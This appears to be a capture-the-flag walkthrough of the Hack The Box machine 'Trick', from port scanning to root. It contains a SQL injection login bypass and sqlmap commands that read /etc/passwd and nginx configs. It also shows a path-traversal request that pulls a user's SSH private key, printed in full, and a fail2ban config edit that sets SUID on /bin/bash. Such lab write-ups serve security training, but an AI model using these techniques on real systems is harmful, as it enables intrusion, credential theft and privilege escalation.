`sudo nmap -sC -sS 10.10.11.166 -oA trick`

`sudo rustscan -a 10.10.11.166 --scripts none --ulimit 5000`

```txt
Open 10.10.11.166:22
Open 10.10.11.166:25
Open 10.10.11.166:53
Open 10.10.11.166:80
10.10.11.166 -> [22,25,53,80]
```

`sudo rustscan -a 10.10.11.166 -p 22,25,53,80 -- -sC -sV`

```txt
Nmap scan report for trick.htb (10.10.11.166)
Host is up, received echo-reply ttl 63 (0.050s latency).
Scanned at 2022-07-16 06:04:10 EDT for 48s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Rh57OmAndXFukHce0Tr4BL8CWC8yACwWdu8VZcBPGuMUH8VkvzqseeC8MYxt5SPL1aJmAsZSgOUreAJNlYNBBKjMoFwyDdArWhqDThlgBf6aqwqMRo3XWIcbQOBkrisgqcPnRKlwh+vqArsj5OAZaUq8zs7Q3elE6HrDnj779JHCc5eba+DR+Cqk1u4JxfC6mGsaNMAXoaRKsAYlwf4Yjhonl6A6MkWszz7t9q5r2bImuYAC0cvgiHJdgLcr0WJh+lV8YIkPyya1vJFp1gN4Pg7I6CmMaiWSMgSem5aVlKmrLMX10MWhewnyuH2ekMFXUKJ8wv4DgifiAIvd6AGR
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoXvyMKuWhQvWx52EFXK9ytX/pGmjZptG8Kb+DOgKcGeBgGPKX3ZpryuGR44av0WnKP0gnRLWk7UCbqY3mxXU0=
|   256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGY1WZWn9xuvXhfxFFm82J9eRGNYJ9NnfzECUm0faUXm
25/tcp open  smtp    syn-ack ttl 63 Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    syn-ack ttl 63 nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:04
Completed NSE at 06:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:04
Completed NSE at 06:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:04
Completed NSE at 06:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.26 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (204B)
```

`nslookup`
`SERVER 10.10.11.166 #Select dns server`
`127.0.0.1`
`10.10.11.166`

After trying with different dns enum, we found the hostname:
`166.11.10.10.in-addr.arpa       name = trick.htb.`

Let's add this in /etc/hosts file.

Let's try to enemurate more:
`dig any @10.10.11.166 trick.htb`

We got a subdomain root.trick.htb

`dig axfr @10.10.11.166 trick.htb`

preprod-payroll.trick.htb

http://preprod-payroll.trick.htb/login.php

Now let's try to find out more domains if there is any:

`ffuf -w /usr/share/wordlists/bitquark-subdomains-top100000.txt -u http://trick.htb/ -H "Host: FUZZ.trick.htb"`

No luck with fuzzing. Let's try to login via SQL injection with `admin' or '1'='1`
Logged in!
From settings we found the password:
`SuperGucciRainbowCake`

Now as we know the site is vulnerable, we tried to perform sql injection by a saved request file with sqlmap:

We found the DB name `payroll_db` and now we will try to see if we can read any file in the server....

`sqlmap -r sql.reqfile --dbms mysql -D payroll_db --file-read=/etc/passwd --threads 10`

Seems like we were able to read the files. So after enemurating more, we suspected that some useful information about nginx.

https://thatcoder.space/nginx-configurations-and-hacks/

We tried to read the site's nginx configuration to understand it better.

`sqlmap -r sql.reqfile --dbms mysql -D payroll_db --file-read=/etc/nginx/nginx.conf --threads 10`

`sqlmap -r sql.reqfile --dbms mysql -D payroll_db --file-read=/etc/nginx/sites-enabled/default --threads 10`

After going through the files, we found another subdomain `market` in which we suspected LFI vulnerability. So to perform the LFI, we triend to read the index page to see if any filter was used to bypass LFI.

`sqlmap -r sql.reqfile --dbms mysql -D payroll_db --file-read=/var/www/market/index.php --threads 10`

We found the filter and we bypassed it to perform LFI. We found the OPENSSH private key in the `/home/michael/.ssh/id_rsa` file.

`GET /index.php?page=..././..././..././home/michael/.ssh/id_rsa`

Full request:
```txt
GET /index.php?page=..././..././..././home/michael/.ssh/id_rsa HTTP/1.1

Host: preprod-marketing.trick.htb

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close
```

```txt
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Let's save it as key.pem

Now, give the file proper permission:
`chmod 400 key.pem`

Let's try to log in via SSH:
`ssh michael@10.10.11.166 -i key.pem`

As we are in, the user flag is in user.txt file
User Flag: `c5baa4266e32e2ae5b21d804********`

Now let's try to find the priviledges by running `sudo -l`

```txt
User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

After searcing the internet, we found some blog worth looking into!

https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/
https://www.youtube.com/watch?v=zDf2hpCu7D0&t=1187s&ab_channel=HackingWalkthroughs

`cd /etc/fail2ban/action.d`

We followed the guideline and did the following....

Edited the `iptables-multiport.conf` file wit vim and replaced the commands of `actionban` and `actionunban`  with `chmod +s /bin/bash`

`actionban = chmod +s /bin/bash`
`actionunban = chmod +s /bin/bash`

Then we saved the file using `:wq!` command.

Then we restarted the fail2ban service by running the following command:
`sudo /etc/init.d/fail2ban restart`

After the service restarted, we tried to attempt failed login so that our command executes.

`sshpass -p test ssh miachael@10.10.11.166`

While attempting, we watched the permission of bash shell using `watch -n 0 ls -la /bin/bash` command.

After 5 times failed attempt, we saw that our permission of bash file changed. Now we tried to run the bash shell using `bash -p` command.

Now we have root!

We found the root flag in /root/root.txt

Root Flag: `b03a2e8b76cf2b89c0b173ee********`
